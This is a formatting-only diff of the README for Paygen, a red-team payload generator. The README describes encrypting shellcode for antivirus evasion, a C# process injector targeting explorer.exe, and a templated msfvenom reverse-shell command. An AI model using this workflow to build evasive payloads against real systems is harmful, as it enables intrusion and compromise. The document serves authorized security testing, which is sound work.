@@ -13,7 +13,7 @@ Paygen is a terminal-based payload generation framework for security researchers
 ## Features
 
 - 🎨 **Beautiful TUI** - Catppuccin Mocha theme with vim-style navigation
-- 📋 **Recipe System** - YAML-based payload definitions with rich metadata  
+- 📋 **Recipe System** - YAML-based payload definitions with rich metadata
 - 🔄 **Preprocessing** - Chain XOR/AES encryption, compression, encoding
 - 🎯 **MITRE ATT&CK** - Built-in tactic and technique mappings
 - 📊 **Effectiveness** - HIGH/MEDIUM/LOW evasion ratings
@@ -29,7 +29,7 @@ Paygen is a terminal-based payload generation framework for security researchers
 git clone https://github.com/Hailst0rm1/paygen.git
 cd paygen
 
-# Install dependencies  
+# Install dependencies
 pip install -r requirements.txt
 
 # Run paygen
@@ -59,15 +59,15 @@ python -m src.main
 
 ## Navigation
 
-| Key | Action |
-|-----|--------|
-| `j`/`k`, `↑`/`↓` | Navigate |
-| `h`/`l`, `Tab` | Switch panels |
-| `Ctrl+G` | Generate payload |
-| `Ctrl+H` | Build history |
-| `Ctrl+F` | Fullscreen code |
-| `?` | Help |
-| `Ctrl+Q` | Quit |
+| Key              | Action           |
+| ---------------- | ---------------- |
+| `j`/`k`, `↑`/`↓` | Navigate         |
+| `h`/`l`, `Tab`   | Switch panels    |
+| `Ctrl+G`         | Generate payload |
+| `Ctrl+H`         | Build history    |
+| `Ctrl+F`         | Fullscreen code  |
+| `?`              | Help             |
+| `Ctrl+Q`         | Quit             |
 
 ---
 
@@ -80,7 +80,7 @@ meta:
   name: "Recipe Name"
   category: "Process Injection"
   description: "What this payload does"
-  effectiveness: high  # low, medium, high
+  effectiveness: high # low, medium, high
   mitre:
     tactic: "TA0005 - Defense Evasion"
     technique: "T1055 - Process Injection"
@@ -111,7 +111,7 @@ preprocessing:
     output_var: "encrypted"
 
 output:
-  type: "template"  # or "command"
+  type: "template" # or "command"
   template: "injector.cs"
   compile:
     enabled: true
@@ -128,7 +128,7 @@ output:
 Located in `preprocessors/`:
 
 - `xor_encrypt.py` - XOR encryption with auto-key generation
-- `aes_encrypt.py` - AES-256-CBC encryption  
+- `aes_encrypt.py` - AES-256-CBC encryption
 - `base64_encode.py` - Base64 encoding
 - `compress.py` - Gzip compression
 - `format_csharp.py` - Format bytes as C# arrays
@@ -166,8 +166,8 @@ output_dir: "~/Documents/Tools/paygen/output"
 
 keep_source_files: false
 show_build_debug: false
-remove_comments: true      # Strip comments from source before compilation
-strip_binaries: true       # Remove debug symbols from compiled binaries
+remove_comments: true # Strip comments from source before compilation
+strip_binaries: true # Remove debug symbols from compiled binaries
 ```
 
 ---
@@ -189,7 +189,7 @@ Simple msfvenom reverse TCP shell:
 Process injection with AES-256-CBC encryption:
 
 ```bash
-# Select: "C# AES-Encrypted Shellcode Injector"  
+# Select: "C# AES-Encrypted Shellcode Injector"
 # Parameters: target_process=explorer.exe, lhost, lport
 # Steps: msfvenom → AES encrypt → C# template → compile
 # Output: injector.exe
@@ -238,7 +238,7 @@ using System;
 class MyPayload {
     static byte[] encrypted = { {{ encrypted_shellcode }} };
     static byte[] key = { {{ aes_key }} };
-    
+
     static void Main() {
         // Your payload logic
     }
@@ -263,7 +263,7 @@ preprocessing:
     name: "gen_shellcode"
     command: "msfvenom -p windows/x64/... LHOST={{ lhost }} -f raw"
     output_var: "shellcode"
-  
+
   - type: "script"
     name: "encrypt"
     script: "aes_encrypt.py"
@@ -292,10 +292,10 @@ import base64
 def main():
     args = json.load(sys.stdin)
     data = base64.b64decode(args['data'])
-    
+
     # Your processing logic
     result = process(data)
-    
+
     output = {
         'processed': base64.b64encode(result).decode(),
         'size': len(result)
@@ -317,17 +317,20 @@ if __name__ == "__main__":
 ⚠️ **Important**: This tool generates malicious payloads for authorized security testing ONLY.
 
 **Authorized Use:**
+
 - ✅ Penetration testing with written authorization
 - ✅ Red team operations
 - ✅ Security research in controlled environments
 - ✅ Educational purposes
 
 **Never Use For:**
+
 - ❌ Unauthorized access
 - ❌ Malicious activity
 - ❌ Illegal operations
 
 **OpSec:**
+
 - `output/` directory is gitignored (NEVER commit payloads)
 - `config.yaml` contains local paths (gitignored)
 - `history.json` contains sensitive build data (gitignored)
